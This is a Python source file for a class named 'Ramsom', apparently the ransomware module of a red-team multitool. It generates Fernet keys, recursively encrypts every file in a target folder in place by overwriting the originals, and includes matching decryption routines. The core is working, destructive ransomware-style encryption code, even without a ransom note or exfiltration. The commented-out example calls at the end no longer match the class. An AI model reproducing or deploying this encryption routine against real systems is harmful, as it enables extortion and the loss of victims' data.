from cryptography.fernet import Fernet
from textual.widgets import TextLog
import os

class Ramsom:
    def __init__(self):
        pass

    def getKey(self): return self.key
    
    def setKey(self, keypath,t:TextLog):
        try:
            with open("keys/"+keypath+".key","r") as key: self.key=key.read()
            t.write(f"[$error]Using file key {keypath}.key with value: '{self.key}'")
        except:
            t.write("[$error]WARNING: key file name does not exhists")

    def Key_gen(self,name,t:TextLog):
        key=Fernet.generate_key()
        if os.path.exists("keys/"+name+".key"):
            t.write("[$error]WARNING: key file name already exhists, use another name")
        else:
            with open("keys/"+name+".key","wb") as keyF:keyF.write(key)
            t.write(f"[$sucess]New key generated at {name}.key with value: {key.decode()}")

    def deleteKEY(self,name,t:TextLog):
        if os.path.exists("keys/"+name+".key"):
            os.remove("keys/"+name+".key")
            t.write("[$Success]KEY succesfuly deleted")
        else:
            t.write("[$error]WARNING: key file name does not exhists")

    def crypt(self,path,t:TextLog):
        t.write("encription Started....")
        self.cryptfolder(path)
        t.write("encription finished")
    
    def decrypt(self,path,t:TextLog):
        t.write("Decription Started....")
        self.decryptfolder(path)
        t.write("Decription finished")

    def cryptfolder(self,path):
        for f in os.scandir(path):self.cryptfolder(path+"/"+f.name) if f.is_dir() else self.__CipherFile__(path+"/"+f.name)

    def decryptfolder(self,path):
        for f in os.scandir(path): self.decryptfolder(path+"/"+f.name) if f.is_dir() else self.__DecipherFile__(path+"/"+f.name)

    def __CipherFile__(self,path):
        ferCP=Fernet(self.key)
        with open(path,"rb") as plain: p=plain.read()
        with open(path,"wb") as orig: orig.write(ferCP.encrypt(p))

    def __DecipherFile__(self,path):
        ferDC=Fernet(self.key)
        with open(path,"rb") as cryp: dc=cryp.read()
        with open(path,"wb") as rest: rest.write(ferDC.decrypt(dc))
    

if __name__=="__main__":
    pass
    #Key_gen()
    #r=Ramsom("/home/miky/Desktop/RedPyMultytool/TargetFolder","filekey.key")
    #r.crypt()
    #r.decrypt()
    #cryptfolder("/home/miky/Desktop/RedPyMultytool/TargetFolder",k)
    #decryptfolder("/home/miky/Desktop/RedPyMultytool/TargetFolder",k)
